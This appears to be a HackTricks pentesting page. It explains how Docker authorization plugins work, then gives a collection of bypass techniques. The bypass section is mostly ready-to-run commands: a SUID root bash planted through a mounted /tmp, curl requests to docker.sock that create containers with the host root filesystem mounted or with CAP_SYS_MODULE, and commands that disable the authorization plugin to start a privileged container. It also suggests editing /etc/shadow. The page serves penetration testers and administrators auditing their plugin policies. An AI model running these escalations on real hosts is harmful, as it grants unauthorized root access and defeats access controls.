

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


**Docker’s** out-of-the-box **authorization** model is **all or nothing**. Any user with permission to access the Docker daemon can **run any** Docker client **command**. The same is true for callers using Docker’s Engine API to contact the daemon. If you require **greater access control**, you can create **authorization plugins** and add them to your Docker daemon configuration. Using an authorization plugin, a Docker administrator can **configure granular access** policies for managing access to the Docker daemon.

# Basic architecture

Docker Auth plugins are **external** **plugins** you can use to **allow/deny** **actions** requested to the Docker Daemon **depending** on the **user** that requested it and the **action** **requested**.

When an **HTTP** **request** is made to the Docker **daemon** through the CLI or via the Engine API, the **authentication** **subsystem** **passes** the request to the installed **authentication** **plugin**(s). The request contains the user (caller) and command context. The **plugin** is responsible for deciding whether to **allow** or **deny** the request.

The sequence diagrams below depict an allow and deny authorization flow:

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Each request sent to the plugin **includes the authenticated user, the HTTP headers, and the request/response body**. Only the **user name** and the **authentication method** used are passed to the plugin. Most importantly, **no** user **credentials** or tokens are passed. Finally, **not all request/response bodies are sent** to the authorization plugin. Only those request/response bodies where the `Content-Type` is either `text/*` or `application/json` are sent.

For commands that can potentially hijack the HTTP connection (`HTTP Upgrade`), such as `exec`, the authorization plugin is only called for the initial HTTP requests. Once the plugin approves the command, authorization is not applied to the rest of the flow. Specifically, the streaming data is not passed to the authorization plugins. For commands that return chunked HTTP response, such as `logs` and `events`, only the HTTP request is sent to the authorization plugins.

During request/response processing, some authorization flows might need to do additional queries to the Docker daemon. To complete such flows, plugins can call the daemon API similar to a regular user. To enable these additional queries, the plugin must provide the means for an administrator to configure proper authentication and security policies.

## Several Plugins

You are responsible for **registering** your **plugin** as part of the Docker daemon **startup**. You can install **multiple plugins and chain them together**. This chain can be ordered. Each request to the daemon passes in order through the chain. Only when **all the plugins grant access** to the resource, is the access granted.

# Plugin Examples

## Twistlock AuthZ Broker

The plugin [**authz**](https://github.com/twistlock/authz) allows you to create a simple **JSON** file that the **plugin** will be **reading** to authorize the requests. Therefore, it gives you the opportunity to control very easily which API endpoints can reach each user.

This is an example that will allow Alice and Bob can create new containers: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

In the page [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) you can find the relation between the requested URL and the action. In the page [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) you can find the relation between the action name and the action

## Simple Plugin Tutorial

You can find an **easy to understand plugin** with detailed information about installation and debugging here: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Read the `README` and the `plugin.go` code to understand how is it working.

# Docker Auth Plugin Bypass

## Enumerate access

The main things to check are the **which endpoints are allowed** and **which values of HostConfig are allowed**.

To perform this enumeration you can **use the tool** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## disallowed `run --privileged`

### Minimum Privileges

```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```

### Running a container and then getting a privileged session

In this case the sysadmin **disallowed users to mount volumes and run containers with the `--privileged` flag** or give any extra capability to the container:

```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```

However, a user can **create a shell inside the running container and give it the extra privileges**:

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```

Now, the user can escape from the container using any of the [**previously discussed techniques**](./#privileged-flag) and **escalate privileges** inside the host.

## Mount Writable Folder

In this case the sysadmin **disallowed users to run containers with the `--privileged` flag** or give any extra capability to the container, and he only allowed to mount the `/tmp` folder:

```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
 -p #This will give you a shell as root
```

{% hint style="info" %}
Note that maybe you cannot mount the folder `/tmp` but you can mount a **different writable folder**. You can find writable directories using: `find / -writable -type d 2>/dev/null`

**Note that not all the directories in a linux machine will support the suid bit!** In order to check which directories support the suid bit run `mount | grep -v "nosuid"` For example usually `/dev/shm` , `/run` , `/proc` , `/sys/fs/cgroup` and `/var/lib/lxcfs` don't support the suid bit.

Note also that if you can **mount `/etc`** or any other folder **containing configuration files**, you may change them from the docker container as root in order to **abuse them in the host** and escalate privileges (maybe modifying `/etc/shadow`)
{% endhint %}

## Unchecked API Endpoint

The responsibility of the sysadmin configuring this plugin would be to control which actions and with which privileges each user can perform. Therefore, if the admin takes a **blacklist** approach with the endpoints and the attributes he might **forget some of them** that could allow an attacker to **escalate privileges.**

You can check the docker API in [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Unchecked JSON Structure

### Binds in root

It's possible that when the sysadmin configured the docker firewall he **forgot about some important parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Binds**".\
In the following example it's possible to abuse this misconfiguration to create and run a container that mounts the root (/) folder of the host:

```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```

{% hint style="warning" %}
Note how in this example we are using the **`Binds`** param as a root level key in the JSON but in the API it appears under the key **`HostConfig`**
{% endhint %}

### Binds in HostConfig

Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:

```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```

### Mounts in root

Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:

```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```

### Mounts in HostConfig

Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:

```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```

## Unchecked JSON Attribute

It's possible that when the sysadmin configured the docker firewall he **forgot about some important attribute of a parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Capabilities**" inside "**HostConfig**". In the following example it's possible to abuse this misconfiguration to create and run a container with the **SYS\_MODULE** capability:

```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```

{% hint style="info" %}
The **`HostConfig`** is the key that usually contains the **interesting** **privileges** to escape from the container. However, as we have discussed previously, note how using Binds outside of it also works and may allow you to bypass restrictions.
{% endhint %}

## Disabling Plugin

If the **sysadmin** **forgotten** to **forbid** the ability to **disable** the **plugin**, you can take advantage of this to completely disable it!

```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```

Remember to **re-enable the plugin after escalating**, or a **restart of docker service won’t work**!

## Auth Plugin Bypass writeups

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

# References

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


